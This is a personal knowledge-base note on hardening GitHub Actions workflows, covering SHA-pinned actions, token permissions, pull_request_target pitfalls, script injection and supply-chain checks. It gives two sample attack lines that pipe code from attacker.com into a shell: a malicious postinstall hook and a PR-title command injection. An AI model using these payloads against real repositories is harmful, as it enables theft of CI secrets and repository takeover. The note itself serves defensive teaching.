---
tags:
  - devops
  - github-actions
  - security
  - hardening
  - supply-chain
created: 2026-07-17
source: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
---

# GitHub Actions - Security Hardening

> The 2026 baseline: **SHA-pinned actions, restricted `GITHUB_TOKEN`, no `pull_request_target` + `checkout` on untrusted refs, no expression interpolation into `run:`**. Back to [[GitHub Actions Guide]].

---

## The Threat Model

A GitHub Actions runner has:
- Read/write access to the repo (`GITHUB_TOKEN`).
- Whatever secrets the workflow references.
- Whatever cloud identities OIDC grants.
- Full network egress (by default).
- Ability to run arbitrary code — actions are just code.

Attack surface:
1. **Malicious third-party action** — you `uses:` someone else's code.
2. **Compromised action tag** — the tag you trusted moves to bad code.
3. **Script injection** — untrusted PR-controlled data ends up in `run:`.
4. **`pull_request_target` misuse** — write token given to fork-controlled code.
5. **Leaked `GITHUB_TOKEN`** — over-scoped or exfiltrated by a bad action.
6. **Leaked cloud creds** — long-lived static keys stored as secrets.
7. **Cache poisoning** — malicious PR seeds a cache, later runs pick it up.

Every hardening below addresses one or more of these.

---

## 1. Pin Actions to Full-Length Commit SHAs

Docs and OpenSSF Scorecard converge: **pin `uses:` to a full 40-char SHA**, not a tag.

```yaml
# ❌ Tag — anyone with push access to the action's repo can move v4 to malicious code
uses: actions/checkout@v4

# ❌ Branch — even worse
uses: actions/checkout@main

# ✅ SHA — bytes-immutable; only Dependabot/Renovate can update this
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   # v4.2.2
```

**Comment the version** after the SHA so PR reviewers can see what's being bumped.

Dependabot supports action-SHA updates natively:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule: { interval: "weekly" }
```

Renovate can do the same with more configuration surface.

**Enforce via policy**: Org → Settings → Actions → "Allow specified actions and reusable workflows" with SHA-pin patterns. Or use OSSF Scorecard's `Pinned-Dependencies` check in CI, gating on a threshold.

---

## 2. Restrict `GITHUB_TOKEN` Permissions

Every workflow gets a `GITHUB_TOKEN`. Its default depends on the org's setting — increasingly "restricted" (read-only on `contents`, everything else `none`).

Explicit is better than default:

```yaml
permissions: {}                     # start from nothing

jobs:
  build:
    permissions:
      contents: read                # to check out
      packages: write               # to push to GHCR
      id-token: write               # for OIDC
    steps: [...]
```

**Org-level default**: Org → Settings → Actions → Workflow permissions → set to *"Read repository contents and packages permissions"* as the max default, then explicitly grant elsewhere. Downgrade-only from a reusable workflow perspective (see [[GitHub Actions - Reusable Workflows and Composite Actions]]).

### Scopes reference

Common scopes: `actions`, `contents`, `deployments`, `id-token`, `issues`, `packages`, `pull-requests`, `checks`, `statuses`, `security-events`.

- `read | write | none` per scope.
- `id-token` supports only `write | none`.
- Shortcut: `permissions: read-all` / `write-all` — avoid `write-all`.

---

## 3. `pull_request_target` — the #1 Footgun

`pull_request` runs in the **fork's** context (no repo secrets, no write token) — safe for arbitrary PRs.

`pull_request_target` runs in the **base repo's** context — has `secrets` and write `GITHUB_TOKEN` — **but the PR's code is still fork-controlled**. Combined with `actions/checkout` of the PR ref, this gives a fork arbitrary write access to the repo:

### ❌ Fatal pattern

```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@...
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← fork's code
      - run: npm ci && npm test                            # ← runs with base repo secrets
```

A PR from a fork can put `postinstall: curl attacker.com | sh` in its `package.json`, and it executes with your `GITHUB_TOKEN` and all your secrets.

### ✅ Safe patterns

- Use `pull_request` (default). Fork PRs don't get secrets — that's the point.
- If you *must* label/comment PRs (needs write token), use `pull_request_target` **without** checking out the PR ref. Only use `github.event.pull_request` metadata.
- For PR-driven deploys, use a **manual `workflow_dispatch`** after review, not automatic on `pull_request_target`.

---

## 4. Script Injection via Untrusted Expressions

The runner substitutes `${{ ... }}` **before** the shell sees the script. Untrusted values become raw shell:

### ❌ PR title interpolated into `run:`

```yaml
run: echo "New PR: ${{ github.event.pull_request.title }}"
```

If a PR title is `"; curl attacker.com/x.sh | sh #`, the runner expands to:

```
echo "New PR: "; curl attacker.com/x.sh | sh #"
```

### ✅ Bind via env, then use shell expansion

```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "New PR: $PR_TITLE"
```

The value goes through the env var — the shell tokenizer sees `$PR_TITLE` as a single string, not raw script. Same idea for issue titles, commit messages, branch names, comment bodies, PR body, any user-controlled text.

**Rule**: never interpolate `github.event.*.title`, `github.event.*.body`, `github.head_ref`, `github.event.head_commit.message`, or similar directly into `run:`.

---

## 5. Third-Party Action Vetting

Before adding a `uses: someone/thing@...`:

1. **Who publishes it?** Verified creator? Real org? Personal account?
2. **How many stars / downloads / recent commits?** Not proof of safety, but signals.
3. **Does the action's own workflow SHA-pin its dependencies?** OSSF Scorecard reports this.
4. **Is the code auditable?** Prefer TypeScript/JavaScript actions you can read over Docker actions with opaque images.
5. **What's the release cadence?** A dead action becomes a supply-chain risk when someone else buys the account.

**Enterprise policy**: Org → Settings → Actions → allowlist. Restrict to `actions/*`, `github/*`, a curated list, and full org-internal actions.

**Typosquatting** — attackers publish `action-checkout`, `action-github`, `checkout-action`, etc. Always verify the exact owner name.

---

## 6. `StepSecurity Harden-Runner`

An action that starts a network-egress policy for the rest of the job:

```yaml
- uses: step-security/harden-runner@...
  with:
    egress-policy: block                     # or 'audit' first, then 'block'
    allowed-endpoints: >
      github.com:443
      api.github.com:443
      registry.npmjs.org:443
      ghcr.io:443
```

Job outbound traffic is restricted; unexpected callbacks fire alerts. Useful for high-value repos to detect a compromised action phoning home. Not a substitute for the other controls; a defense-in-depth layer.

---

## 7. OSSF Scorecard

The **OpenSSF Scorecard** grades a repo on ~20 security checks, including:

- `Pinned-Dependencies` — actions SHA-pinned.
- `Token-Permissions` — workflows explicit and least-privilege.
- `Dangerous-Workflow` — no unsafe `pull_request_target` patterns.
- `Dependency-Update-Tool` — Renovate/Dependabot configured.
- `Signed-Releases` — Sigstore attestations attached to releases.
- `SAST`, `Fuzzing`, `Code-Review`, `Branch-Protection`, etc.

Run via `ossf/scorecard-action` in CI; report to `security-events` for the Security tab.

Aim for scores 7+ on production repos; 8+ on shared/publishable ones.

---

## 8. Dependency Review Action

`actions/dependency-review-action@...` — flags CVEs and license issues on PR-introduced dependency changes:

```yaml
on: [pull_request]
permissions:
  contents: read
  pull-requests: write

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/dependency-review-action@...
        with:
          fail-on-severity: high
          deny-licenses: 'AGPL-3.0, GPL-3.0'
```

Comments on the PR with a diff of dependency changes; fails the check on high-severity CVEs. Requires GitHub Advanced Security on private repos.

---

## 9. CodeQL

GitHub's static analysis engine. Free for public repos; part of GHAS for private:

```yaml
- uses: github/codeql-action/init@...
  with:
    languages: 'javascript, python'
- uses: github/codeql-action/analyze@...
```

Runs semantic queries deeper than pattern-matching SAST. Findings land in the Security tab. Combine with Semgrep for broader coverage; they catch different classes of bugs.

---

## 10. Cache Poisoning Awareness

`actions/cache` restores are keyed by workflow-defined strings. A malicious PR could:
- Populate a cache with backdoored files under a key the base branch also uses.
- Rely on `restore-keys` prefix matching to have that cache picked up later.

Mitigations:
- Never allow untrusted PRs to write caches that main-branch runs would restore. GitHub already scopes caches to the source branch, but be careful with `restore-keys` that could match a fork-scoped cache. (In practice, PR caches don't spill into base-branch reads — but verify per docs.)
- Consider `cache-hit`-guarded verification (`if:` check on cache miss to rebuild).

---

## Summary — the 2026 Hardening Checklist

| Control | Priority |
|---------|----------|
| Pin `uses:` to full commit SHAs | Very high |
| Restrict `GITHUB_TOKEN` (start from `{}`) | Very high |
| Never `pull_request_target` + checkout of PR ref | Very high |
| Env-bind untrusted values, never interpolate into `run:` | Very high |
| OIDC federation for cloud creds (see [[GitHub Actions - Secrets and OIDC]]) | Very high |
| Environment protection rules for prod (see [[GitHub Actions - Deployment Environments and Approvals]]) | High |
| Dependabot / Renovate for action-SHA bumps | High |
| Action allowlist at org level | High |
| Dependency review + CodeQL / Semgrep on every PR | High |
| StepSecurity Harden-Runner egress policy | Medium (defense in depth) |
| OSSF Scorecard grade tracking | Medium (visibility) |
| Ephemeral self-hosted runners (see [[GitHub Actions - Self-hosted Runners]]) | Very high — if self-hosting |

---

## Related Notes

- [[GitHub Actions - Secrets and OIDC]] — OIDC federation, environment secrets
- [[GitHub Actions - Deployment Environments and Approvals]] — reviewer gates on prod
- [[GitHub Actions - Self-hosted Runners]] — runner-side hardening
- [[GitHub Actions - Reusable Workflows and Composite Actions]] — permissions inheritance
- [[CI-CD - Security and Compliance]] — SBOM, signing, SLSA
